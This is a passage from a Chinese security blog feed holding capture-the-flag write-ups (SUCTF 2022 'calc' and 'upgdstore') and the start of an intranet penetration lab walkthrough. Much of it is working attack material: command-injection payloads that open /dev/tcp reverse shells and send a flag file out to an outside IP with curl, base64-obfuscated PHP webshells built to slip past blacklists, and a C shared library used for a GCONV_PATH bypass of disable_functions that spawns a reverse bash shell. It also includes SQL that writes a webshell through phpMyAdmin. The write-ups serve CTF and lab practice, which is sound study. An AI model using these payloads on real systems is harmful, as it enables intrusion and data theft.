invoke__">serialize</span>(<span class="variable">$f1</span>);</span><br></pre></td></tr></table></figure><p>命令执行点注意闭合前面的<code>&lt;?php</code>标签绕过<code>#</code>注释符的说。</p><p><img src="/images/BUU/20220412221927.png"></p><p>这么多文件，小孩子才做选择，大人全都要</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">$m2-&gt;m1=&quot;?&gt;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat *&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;;</span></span><br></pre></td></tr></table></figure><p>藏在注释里的flag</p><p><img src="/images/BUU/20220412222531.png"></p><h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>题目贴心地给出了源码附件呢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br></pre></td></tr></table></figure><p>最开始以为是ssti，只是上了个有亿点狠的waf</p><p>手动测试了常见的payload后感觉<code>eval()</code>应该是重伤倒地了，得找找还有没有其它命令执行点的说。</p><p>正好下面还有个<code>os.system()</code>，相当于</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">time</span> ip &#123;payload&#125; &gt; ./tmp/<span class="built_in">log</span>.txt</span><br></pre></td></tr></table></figure><p>waf把<code>;</code> <code>&amp;</code>都过滤了，截断不能（瘫</p><p>但其实截不截断的都无所谓啦，只要我们想执行的代码能跑就行，因此还是比较容易想到套娃式处理命令的反引号的。</p><p>这里我最开始以自己对重定向的理解试了试不用<code>&amp;</code>构造一个野鸡版反弹shell，均以失败告终（悲</p><p>其中的迷惑操作包括但不限于</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>#`bash%<span class="number">20</span>-i%<span class="number">200</span>&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>%<span class="number">201</span>&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>`</span><br></pre></td></tr></table></figure><p><del>（学习中 求轻喷）</del></p><p>说实话一直对重定向的<code>&amp;</code>符似懂非懂 越往下挖越接近底层实现了 挖了个陨石坑属于是</p><p>所以就改成分步执行命令了</p><p>直接写命令的话会在<code>eval()</code>处报错而跳过<code>os.system()</code>，因此用<code>#</code>注释符注释掉要执行的命令，待绕过waf后它仍会正常跑的。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>#`whoami&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>`</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220413172345.png"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>#`ls&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>`</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220413151334.png"></p><p>把flag存进<code>./tmp/log.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">1#</span><span class="language-bash">`<span class="built_in">cat</span>%20T*`</span></span><br></pre></td></tr></table></figure><p>再利用<code>curl</code>把<code>./tmp/log.txt</code>带出来</p><blockquote><p>-F参数用来向服务器上传二进制文件。</p><p>$ curl -F ‘file=@photo.png’ <a href="http://233.33.3.333">http://233.33.3.333</a></p><p>上面命令会给 HTTP 请求加上标头Content-Type: multipart/form-data，然后将文件photo.png作为file字段上传。</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>#`curl%<span class="number">20</span>-F%<span class="number">20</span>flag=@tmp/log.txt%<span class="number">20</span>http://<span class="number">233.33.3.333:2333</span>`</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220413203858.png"></p><h1 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h1><p>上传综合题，挺久没做了的说，生疏了好多（悲</p><p><img src="/images/BUU/20220412135630.png"></p><p>要求文件后缀为.php，这题不对劲，危</p><p>上传个pureshell逝逝</p><p><img src="/images/BUU/20220412140609.png"></p><p>可恶，你发现了甚么</p><p>得收集更多信息才行，phpinfo看一下</p><p><img src="/images/BUU/20220412141143.png"></p><p>成功上传，感谢出题师傅放行</p><p>啊哈哈哈哈<strong>disable_functions</strong>来咯（悲</p><p><img src="/images/BUU/20220412141602.png"></p><p>哭完还得上路，试试能不能把后端源码抓出来</p><p><code>highlight_file()</code>被禁了，而同类型的<code>show_source()</code>并没有出现在<strong>disable_functions</strong>里</p><p><img src="/images/BUU/20220412143440.png"></p><p>可恶，又被发现了</p><p><code>base64_decode()</code>一下看能不能绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;c2hvd19zb3VyY2U=&#x27;</span>))(<span class="string">&#x27;../index.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功拿到waf源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fun</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<code>strstr()</code>对大小写敏感，这里的blacklist只需用大小写就能绕过了。</p><p>接下来写webshell</p><p>先上传一个文件<strong>s1.php</strong>，一句话的<code>$</code>被过滤了，因此base64编码</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">PD9waHAgZXZhbCgkX1BPU1RbJ3NoJ10pOz8+</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"># </span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sh&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>再上传第二个文件<strong>s2.php</strong>去解码<strong>s1.php</strong>的内容并包含，<code>-</code>被过滤了，也得编码一部分再解回来</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1lMTQxM2MwN2MyYzRjODc2ZTYwMTVhMzUwMjM0OGQzMC5waHA=&quot;</span>));<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"># </span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=e1413c07c2c4c876e6015a3502348d30.php&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>利用文件包含特性和伪协议达到写webshell的目的，太棒了</p><p><img src="/images/BUU/20220412154256.png"></p><p>这时试图用蚁剑直接连接却失败了，应该是<strong>disable_functions</strong>里把蚁剑使用的函数也都禁用了，看来出题师傅想教给我们的还有更多呢。</p><p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV_PATH与iconv进行bypass disable_functions</a></p><p>使用这种更接近底层的绕过手段的前提就是要做到任意文件上传，于是乎对照题目的前后端手动构造了一个没有waf的上传页面的源码<strong>s3.php</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">PGRpdiBjbGFzcz0ibGlnaHQiPjxzcGFuIGNsYXNzPSJnbG93Ij48Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPui1nue+juWkqumYs++8gTxpbnB1dCBjbGFzcz0iaW5wdXRfZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0idXBsb2FkX2ZpbGUiLz48aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJ1cGxvYWQiLz48L2Zvcm0+PC9zcGFuPjxzcGFuIGNsYXNzPSJmbGFyZSI+PC9zcGFuPjxkaXY+PD9waHAgbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VwbG9hZF9maWxlJ11bJ3RtcF9uYW1lJ10sIi90bXAvIi4kX0ZJTEVTWyd1cGxvYWRfZmlsZSddWyduYW1lJ10pOz8+</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"># <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;light&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;glow&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span>赞美太阳！<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;input_file&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;flare&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="string">&quot;/tmp/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>编码进行绕过，再复制一份之前的<strong>s2.php</strong>更名为<strong>s4.php</strong>作为上传点，包含文件换成<strong>s3.php</strong>就好。</p><p>下面制作exp所需文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv_init</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/233.33.3.333/2333 &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成<strong>so</strong>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp.so -shared -fPIC</span><br></pre></td></tr></table></figure><p>书写<strong>gconv-modules</strong>文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  EXP<span class="regexp">//</span>    INTERNAL    ..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp/exp    <span class="number">2</span></span><br><span class="line">module  INTERNAL    EXP<span class="regexp">//</span>    ..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp/exp    <span class="number">2</span></span><br></pre></td></tr></table></figure><p>之后去手动构造的上传点<strong>s4.php</strong>上传这两个文件，再去webshell页面<strong>s2.php</strong>执行下面的代码触发exp，完成反弹shell。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh=putenv(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);include(&#x27;php://filter/<span class="built_in">read</span>=<span class="built_in">convert</span>.iconv.<span class="built_in">exp</span>.utf-<span class="number">8</span>/resource=/tmp/<span class="built_in">exp</span>.so&#x27;);</span><br></pre></td></tr></table></figure><p>查看flag权限，发现只有root能读</p><p><img src="/images/BUU/20220412213148.png"></p><p>康康suid命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /usr/bin -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><code>nl</code>能用，虚惊一场（我在期待什么啊可恶</p><p><img src="/images/BUU/20220412212616.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ezpop&quot;&gt;&lt;a href=&quot;#ezpop&quot; class=&quot;headerlink&quot; title=&quot;ezpop&quot;&gt;&lt;/a&gt;ezpop&lt;/h1&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
    <category term="upload" scheme="https://www.m0x01sery.com/tags/upload/"/>
    
    <category term="python" scheme="https://www.m0x01sery.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>域肾透——从看懂到看开 0x01</title>
    <link href="https://www.m0x01sery.com/2022/04/09/Intranet-penetration-0x01/"/>
    <id>https://www.m0x01sery.com/2022/04/09/Intranet-penetration-0x01/</id>
    <published>2022-04-08T16:00:00.000Z</published>
    <updated>2022-04-09T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>OK兄弟们，全体目光向我看齐！看我看我，我宣布个事儿！</p><p>从今天开始，二号厨房正式投入使用啦！（指正式上手内网渗透</p><p>第一个靶场选择了<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">红日ATT&amp;CK实战系列 红队（一）</a> 据说比较基础（危）所以搭好环境来学习了</p><p>想了想选择先把windows防火墙关了，前期学习进攻思路，之后再学习针对性的过墙叭。</p><span id="more"></span><h1 id="正式开张"><a href="#正式开张" class="headerlink" title="正式开张"></a>正式开张</h1><h2 id="信息收集-stage-1"><a href="#信息收集-stage-1" class="headerlink" title="信息收集 stage-1"></a>信息收集 stage-1</h2><p>nmap进攻性扫描</p><p><img src="/images/BUU/20220409151409.png"></p><p>3389没开</p><p>80端口跑的是php探针，泄漏了不少信息</p><p><img src="/images/BUU/20220409154201.png"></p><p>探针泄漏可遇不可求啊，把页面保存下来，能为后续操作提供不少方便的说</p><p>下面还有个MySQL数据库连接检测，弱密码<code>root/root</code>直接验证成功了，太棒了</p><p>dirsearch扫一扫目录</p><p><img src="/images/BUU/20220409174228.png"></p><p>扫到phpMyAdmin后台，弱密码<code>root/root</code>成功登陆</p><h2 id="getshell-stage-1"><a href="#getshell-stage-1" class="headerlink" title="getshell stage-1"></a>getshell stage-1</h2><p>都拿到phpMyAdmin了写shell的方法还是挺多的。</p><p>由于从探针中我们得知了网页绝对路径，所以可首先试试sql的<code>select xxx into outfile</code>语句将shell写入外部文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[sh]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220409181651.png"></p><p>报错了不让执行的说</p><blockquote><p>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p><p>当secure-file-priv的值为null ，表示限制mysqld 不允许导入|导出</p><p>当secure-file-priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</p><p>当secure-file-priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p><p>在mysql 5.6.34版本以后secure-file-priv的值默认为NULL。并且无法用sql语句对其进行修改。</p><p>windows下:修改mysql.ini 文件，在[mysqld]下添加条目secure-file-priv=空或具体路径，保存，重启mysql。</p><p>Linux下:在/etc/my.cnf的[mysqld]下面添加local-infile=0选项。</p></blockquote><p>于是退而求其次，试试将shell以日志的方式写入文件</p><p>这里我选择<code>general_log</code></p><blockquote><p>general log会记录所有的SQL，一般不会开启开功能，因为log的量会非常庞大。但个别情况下可能会临时的开一会儿general log以供排障使用。 </p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> 